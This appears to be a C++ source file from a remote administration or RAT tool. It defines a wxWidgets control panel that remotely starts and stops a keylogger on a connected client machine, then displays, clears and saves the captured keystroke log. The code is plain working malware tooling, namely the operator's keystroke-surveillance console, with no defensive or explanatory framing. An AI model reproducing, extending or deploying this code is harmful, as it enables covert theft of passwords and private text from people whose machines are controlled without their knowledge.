#include "panel_keylogger.hpp"
#include "frame_client.hpp"

wxBEGIN_EVENT_TABLE(panelKeylogger, wxPanel)
	EVT_TOGGLEBUTTON(EnumIDS::ID_KL_BTN_Toggle, panelKeylogger::OnToggle)
	EVT_BUTTON(EnumIDS::ID_KL_BTN_Clear, panelKeylogger::OnLimpiar)
	EVT_BUTTON(EnumIDS::ID_KL_BTN_Save, panelKeylogger::OnGuardarLog)
wxEND_EVENT_TABLE()

panelKeylogger::panelKeylogger(wxWindow* pParent) :
	wxPanel(pParent, EnumIDS::ID_KL_Panel) {
	this->btn_Iniciar = new wxToggleButton(this, EnumIDS::ID_KL_BTN_Toggle, "Iniciar");
	
	wxSize btn_size = this->btn_Iniciar->GetSize();

	wxButton* btn_Save = new wxButton(this, EnumIDS::ID_KL_BTN_Save, "Guardar log", wxDefaultPosition, btn_size);
	wxButton* btn_Clear = new wxButton(this, EnumIDS::ID_KL_BTN_Clear, "Limpiar log", wxDefaultPosition, btn_size);

	this->txt_Data = new wxTextCtrl(this, EnumIDS::ID_KL_Text_Out, wxEmptyString, wxDefaultPosition, wxSize(500, 600), wxTE_MULTILINE | wxTE_RICH);

	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
	wxBoxSizer* sizer2 = new wxBoxSizer(wxVERTICAL);

	sizer->Add(this->btn_Iniciar, 1, wxALL | wxEXPAND, 1);
	sizer->Add(btn_Save, 1, wxALL | wxEXPAND, 1);
	sizer->Add(btn_Clear, 1, wxALL | wxEXPAND, 1);
	
	sizer2->Add(sizer);
	sizer2->Add(this->txt_Data, 1, wxALL | wxEXPAND, 1);

	this->SetSizerAndFit(sizer2);


}

void panelKeylogger::OnGuardarLog(wxCommandEvent& event) {
	wxFileDialog dialog(this, "Guardar archivo", wxEmptyString, "log.txt", wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);
	if (dialog.ShowModal() == wxID_OK) {
		std::ofstream outFile(std::string(dialog.GetPath()), std::ios::binary);

		if (outFile.is_open()) {
			std::string strBuffer = this->txt_Data->GetValue();
			outFile.write(strBuffer.c_str(), strBuffer.size());

			outFile.flush();
			outFile.close();
		}else {
			std::cout << "[X] No se pudo abrir el archivo " << dialog.GetPath() << std::endl;
			error();
		}
	}
}

void panelKeylogger::OnLimpiar(wxCommandEvent& event) {
	if (this->txt_Data) {
		this->txt_Data->Clear();
	}
}

void panelKeylogger::EnviarComando(std::string strComando, bool isBlock) {
	MyTreeCtrl* temp_tree = (MyTreeCtrl*)this->GetParent();
	if (temp_tree) {
		wxPanel* temp_panel = (wxPanel*)temp_tree->GetParent();
		if (temp_panel) {
			FrameCliente* temp_cliente = (FrameCliente*)temp_panel->GetParent();
			if (temp_cliente) {
				int iEnviado = temp_cliente->EnviarComando(strComando, isBlock);
				std::cout << "[!] " << iEnviado << " bytes enviados" << std::endl;
			}else {
				std::cout << "[X] No se pudo encontrar el panel" << std::endl;
			}
		}else {
			std::cout << "[X] No se pudo encontrar el frame del cliente" << std::endl;
		}
	}else {
		std::cout << "[X] No se pudo encontrar el padre del panel keylogger" << std::endl;
	}
}

void panelKeylogger::OnToggle(wxCommandEvent& event) {
	bool isSel = this->btn_Iniciar->GetValue();
	std::string strComando = "";
	if (isSel) {
		//Iniciar keylogger
		strComando = std::to_string(EnumComandos::KL_Iniciar);
		strComando.append(1, '~');
		this->EnviarComando(strComando, false);
		this->btn_Iniciar->SetLabelText(wxT("Detener"));
	}else {
		//Apagar keylogger
		strComando = std::to_string(EnumComandos::KL_Detener);
		strComando.append(1, '~');
		this->EnviarComando(strComando, false);
		this->btn_Iniciar->SetLabelText(wxT("Iniciar"));
	}
}